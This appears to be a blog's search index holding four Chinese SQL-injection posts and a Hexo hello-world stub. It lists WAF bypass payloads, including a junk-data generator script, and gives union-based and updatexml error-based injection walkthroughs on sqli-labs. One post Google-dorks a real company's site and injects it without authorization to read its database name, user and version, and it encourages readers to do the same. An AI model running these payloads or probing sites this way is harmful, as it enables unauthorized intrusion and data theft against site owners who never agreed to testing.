1. 大小写绕过（现在基本上遇不到了，不过也可以了解一下） 12id=1 and UnIoN sElEcT 1,2,3id=1 OrDeR By 1 2. 双写绕过（原理是一些防护措施只进行一次，可以通过双写关键字的方法绕过） 12id=1 ununionion selselectect 1,2,3 删除一次--&gt; union select 1,2,3id=1 ororderder bbyy 1 删除一次--&gt; order by 1 3. 编码绕过（如果检测的是关键字，那么经过编码即可绕过） URL全编码：http://web.chacuo.net/charseturlencode十六进制：https://www.bejson.com/convert/ox2str/ ps：使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识。这个方法用在不能使用引号时挺好的。 4. 基本符号替换 用&amp;&amp;替换and用||替换or用/**/替换空格URL栏中用+替换空格 5. 报错注入替换函数绕过（网站只检测一部分热门的函数，不检测一些冷门的函数） 全部以select user() 为例： 1.floor()1id = 1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) 2.extractvalue()12id = 1 and extractvalue(1, concat(0x7e,(select user())))id = 1 and extractvalue(1,concat(char(126),database())) 3.updatexml()1id = 1 and updatexml(1,concat(0x7e,(select user())),1) 4.exp()1exp(~(select * from(select user()))a)) 5.总体可以归为一处的函数(1) GeometryCollection() 1id = 1 AND GeometryCollection((select * from (select * from(select user())a)b)) (2) polygon() 1id =1 AND polygon((select * from(select * from(select user())a)b)) (3) multipoint() 1id = 1 AND multipoint((select * from(select * from(select user())a)b)) (4) multilinestring() 1id = 1 AND multilinestring((select * from(select * from(select user())a)b)) (5) linestring() 1id = 1 AND LINESTRING((select * from(select * from(select user())a)b)) (6) multipolygon() 1id =1 AND multipolygon((select * from(select * from(select user())a)b)) 6. 其他等价函数绕过 hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@database ==&gt; database() 7. 内联注释配合注释绕过1Id=1/**//*! order*/+/*!by*/+1 8. %0a换行跳出单行注释绕过原理：数据库中对于#和–(空格)后面的东西都进行注释忽略处理我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。Payload： 12id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3 9. 利用一些中间件的缺陷 IIS+ASP通过在关键词之间加%绕过。 1id=1 and uni%on se%le%ct 1,2,3 from ad%min IIS的Unicode编码IIS支持Unicode编码，可以通过编码关键词进行绕过：http://tool.chinaz.com/tools/unicode.aspx HTTP参数污染有的时候，浏览器对于这样的传参会出现以下情况： 1id=1 and id=2 --&gt; 出现在服务器中，id=1,2 那么我们可以这样绕： 12id=1 and union select username &amp; id= password form admin--&gt; id=1 and union select username, password form admin 对于这种参数重复传参的情况，不同环境有不同结果： 10. 更换传参方式绕过在有些情况下，因为 $_REQUEST[‘id’] 的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了其他传参。 11. 利用数据提取方式的缺陷进行绕过PHP+Apache中，在多参数传参的情况下，某些waf会对传参进行分开验证，我们可以通过分开传参加注释符进行绕过。 Example：在PHP+Apache中x=1&amp;y=2&amp;z=3 在某些waf中会被提取为：x=1y=2z=3payload: 1id=1+union+/*&amp;x=2*/+select/*&amp;y=3*/+1,2,3+from+admin waf检测方式为分别检测三个传参：id=1+union+/*x=2*/+select/*y=3*/1,2,3+from+admin 数据库中，/**/中间的东西被过滤了，获得的传参为： 1id=1+union++select+1,2,3+from+admin 12. 脏数据绕过在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf，详情可以查看链接:https://cloud.tencent.com/developer/article/1592593 12345678910111213141516171819202122#生成垃圾数据#coding=utf-8import random,stringfrom urllib import parsevarname_min = 5varname_max = 15data_min = 20data_max = 25num_min = 50num_max = 100def randstr(length): str_list = [random.choice(string.ascii_letters) for i in range(length)] random_str = &#x27;&#x27;.join(str_list) return random_strdef main(): data=&#123;&#125; for i in range(num_min,num_max): data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max)) print(&#x27;&amp;&#x27;+parse.urlencode(data)+&#x27;&amp;&#x27;)main()","path":"2020/05/12/干货：SQL注入如何绕过WAF/"},{"title":"极易上手的报错注入","text":"报错注入：报错注入的意思是用户通过执行一些语句让数据库报出了致命性错误，只需要在里面放入sql子查询语句，就可以得到对应的信息。 文章开头，先学习一下中华人民共和国网络安全法：https://www.cto.ac.cn/thread-106.htm 漏洞简介在这里先简单介绍一下漏洞之王SQL注入：SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件： 用户可以控制输入。 用户输入的数据被当作代码拼接到了数据库语句当中。 报错注入具体流程1.先打开靶场，靶场我选择sqli-labs的less4，这里我顺手传参了id=1 2.每次看到这种id=的get传参的时候，总是喜欢加个’，这次看到，这里没有效果了，页面还是正常的。 3.那现在怎么办呢，单引号不行，那试试双引号吧 1?id=1&quot; 运气不错，页面报错了，这里作为黑盒测试的话，一看到报错了是最开心的，当然一般还要试试 ?id=1’) 和 ?id=1”) 4.这里还是看看源码来分析吧。这里明显看到，原来id外面先拼接了””语句为： 12$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;; $sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;; 那对于我们传入的数据来说，放入到数据库里面执行的语句就是： 1$sql=&quot;SELECT * FROM users WHERE id=(&quot; $id&quot;) LIMIT 0,1&quot;; 5.也就是说，在传参的时候，我们传入的数据外面有一层双引号之外，还有一层括号，那么闭合的方法就是将之间的单引号换成双引号加括号 后面再加上#注释（也可以通过–+来注释），可以看到页面返回正常，这里的传参是： 1?id=1&quot;) --+ 6.这里已经成功闭合了，那么就开始我们的报错注入吧，在”)和–+中间放入我事先准备好的数据库报错查询语句，成功查询到数据库库名security，传参为： 1?id=1&quot;) and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ 7.既然已经查询到了数据库库名，那么查到数据库里面的数据也就不远了。将报错注入的函数里面的select database()换成查询系统自带库information_schema中的表的语句。传参为： 1?id=1&quot;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+ 8.查询出来一个emails表，感觉没有想要的信息，不想查询它的数据了，更改一下limit 0,1 为limit 1,1 获得另一张表referers。 9.有表名了，那么接下来就是查询referers表中的字段。这里学习一个新的函数，group_concat() ，这个函数会将group by产生的同一个分组中的值连接起来，返回一个字符串结果。什么意思呢，就是我们使用这个函数，可以不需要limit 0，1 ， limit 1，1这样轮询得到所有的数据，一个函数搞定。传参为： 1?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;referers&#x27; limit 0,1),0x7e),1) --+ 得到了这个表中的三个字段为id,referer和ip_address 10.有了表名和字段名，接下来就是查询数据了，通过查询referers表中的referer字段为例，获取数据库信息。传参为: 1?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(referer) from referers),0x7e),1) --+ 这里就获取了里面我随意插入的3个数据admin1，admin2，admin3 总结这里就是报错注入的整个流程了，报错注入在sql注入中占比还是比较大的，还有很多bypass技巧，大家可以自行学习一下。","path":"2020/05/01/极易上手的报错注入/"},{"title":"SQL注入全方位利用之显错注入","text":"显错注入：顾名思义，通过显错点进行注入。那么什么是显错点呢，就是数据库中的查询结果，通过联合查询的方式，叠加替换显示了我们输入的数据。接下来只需要替换数据为我们要查询的SQL语句，就可以得到我们想要的结果。 中华人民共和国网络安全法 漏洞之王SQL注入在这里先简单介绍一下漏洞之王SQL注入：SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件： 用户可以控制输入。 用户输入的数据被当作代码拼接到了数据库语句当中。 显错注入具体流程1.这里我们先打开靶场Sqli-Labs-less1。 2.提示知道了需要在GET传参处传入ID，那么就传入id=1试试。可以看到多了用户名和密码，那么这个页面就是很标准的get传参显示数据的页面了。 3.我们日常进行渗透测试的时候，对于这种id传参或者cid传参或者其他传参，最开始也是最喜欢的，便是传个单引号试试看，这里看到页面直接报错了。（ps:单引号经过了url编码变成了%27）单引号报错那就说明我们传入的1’造成了效果，看到这种情况，我们可以直接认定，这里存在sql注入，后面会教一种简单的方法，可以直接注入，这里先不细说。 4.报错了报错了，为了大家能够更加直观的了解，那么我们直接作弊，看看源码吧。有点乱，这里我们没有php基础了读者可能有点慌，不要紧哦，我们只需要知道我标的那句sql查询语句即可。 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot; 这里大概解释一下，这里是通过查询users表中的id字段中的第一行数据，可以看到，$id处就是我们输入的数据。好的回到之前查询报错处，因为我传入了id=1’ 被放到查询语句中，语句经过拼接变成：SELECT * FROM users WHERE id=’1’’ LIMIT 0,1这里发现了吗，我传入的单引号跟前面的单引号闭合了，可以这样理解，后面那个单引号就像一只单身狗，找不到伙伴，所以生气报错了。 5.那我只需要将后面的单引号丢掉，就可以页面正常显示了，这里使用#注释后面的语句（ps:#经过url编码变成了%23），可以看到，页面直接显示正常了。新的sql查询语句为: 1SELECT * FROM users WHERE id=&#x27;1&#x27; #&#x27; LIMIT 0,1 #后面的东西被注释了，已经没有用了，那么我们就成功跳出了单引号，在单引号和#之间，我们就可以放入自己的语句进行执行。 6.因为这里是显错注入嘛，下一步就要通过order by查询数据库当前的字段数，具体传参为：?id=1’ order by 1#。order by 1页面正常，order by 2页面正常，order by 3页面正常，order by 4页面不正常。这就说明了当前表中的字段为3。 7.下一步就是联合查询了，传参为 ?id=1’ union select 1,2,3 limit 1,1# ，这里我通过刚刚知道了字段数为3，所以将语句换成了union select 1,2,3 ，这样的语句在页面是可以正常执行的，但是返回的数据还是dump和dump，这不是我要的显错点，所以我加上了limit 1，1 ，取出第二段数据，成功看到了2和3，这里的2，3就是我们想要的显错点了。 8.嘿嘿，看到2和3了，接下来就好办了，替换2和3为执行语句，就可以获得对应的信息。这里学习3个基础函数：database() 查询当前数据库库名 , user() 查询当前登录的用户名, version() 查询当前数据库版本号。 我把2换成了database()，这里成功查看到了库名security 9.这里普及一下，在mysql数据库中有一个information_schema表，这是系统自带的表，里面放入了我们从建库开始的所有操作，例如建表，加用户。这里给出一条查询语句： 12union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1# 这条语句通过查询了系统自带库获取了里面的表名emails 10.接下来查询这个表里面的字段，语句为： 1union select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 1,1 这里有个坑，表名在语句中是以字符串的形式存在的，所以需要加单引号。这里的传参为： 1?id=1&#x27; union select 1,2,column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=database() limit 1,1# 看到第一个字段为id 1?id=1&#x27; union select 1,2,column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=database() limit 2,1# 看到第二个字段为email_id 11.现在有表名emails，有字段名email_id，那就可以直接查询里面的数据了。将传参换成: 1?id=1&#x27; union select 1,id,email_id from emails limit 1,1# 12.看到了吧，id为1的人的email为&#68;&#117;&#x6d;&#98;&#x40;&#x64;&#104;&#97;&#x6b;&#107;&#x61;&#x6e;&#46;&#x63;&#111;&#109;。这就是显错注入的整个过程。因为说着说着，好像内容有点多，后面的内容就放到以后的推文吧，这里说一下前面说的那个“简单”的方法，在发现报错之后，放上这条语句，可以直接查询到数据库库名哦。 1and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 13.报错注入具体详情请看另一篇文章哦！","path":"2020/03/08/SQL注入全方位利用之显错注入/"},{"title":"花几分钟找个上市公司的SQL注入漏洞","text":"之前发出了一篇显错注入的文章之后，很多读者反馈说难度太大，看不懂，那么今天，我进行了改进，为大家推送一篇漏洞实例，实战演示怎么挖掘sql显错注入漏洞。最后说一句，我们要做一名合法的白帽子，要学会 点到为止 。 中华人民共和国网络安全法 寻找漏洞1.首先打开谷歌镜像站，这里不推荐搭梯子（vpn），因为这个违法且不安全，所以我们使用大佬搭的镜像站（百度搜索，找到一个能用的就行，这里推荐一个http://www.googlen.org/ ），搜索栏里输入： 1inurl:php?sid= 广州 有限公司 2.每打开一个网站，就在它的url地址后面加个单引号‘或者反斜杠\\，如果页面报错了，那么恭喜你，这里有sql注入漏洞。经过尝试，在一个页面中，我加个单引号，页面产生错误了（ps:单引号在url栏里被url编码为%27） 显错注入具体流程1.看到了warning，也就是说这个网站存在sql注入，先在%27后面加个空格，加个%23（%23通过url解码为#，起到注释的作用），新的url传参为： 1?id=243&#x27; # 2.可以看到，闭合成功了，页面返回正常，这个时候，就是猜字段了，在单引号和#之间放入order by 数字，猜字段当前传参为： 1?id=243&#x27; order by 1 # 3.根据之前的教学推文中知道，接下来就是通过order by 判断当前数据库字段数了，order by 1页面正常，order by 2 页面正常……一直到order by 29的时候，页面又出现了错误，下面的文字内容没了，所以我们知道，字段数为28。当前url传参为： 1?id=243&#x27; order by 29 # 4.字段知道了，接下来就是联合查询了，获取了显错点4，6，13。（ps:这里有个坑，243变成了-243，这是为了让联合查询前面的语句报错，这样就会输出后面的显错点了，跟limit 1,1 更换显示为第2行道理相同）当前url传参为： 1?id=-243&#x27; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 # 5.有了显错点，已经可以说是找到漏洞了，我们偷偷看看它的数据库，将4，6，13换成之间推文里提到的函数，获取数据库库名，数据库当前用户名，数据库版本号。 6.这里我打码了一部分，数据库库名开头为ao ，数据库当前用户名为ao***@localhost，数据库当前版本为5.5.45。本次实例就到这里，点到为止嘛，查到库名已经可以去漏洞提交平台进行提交了。本次实例仅作为学习资料，若有出现打码遗漏等问题，也请大家不要对网站进行攻击。","path":"2020/03/02/实例挖掘sql注入显错注入漏洞/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2020/01/14/hello-world/"}],"categories":[],"tags":[]}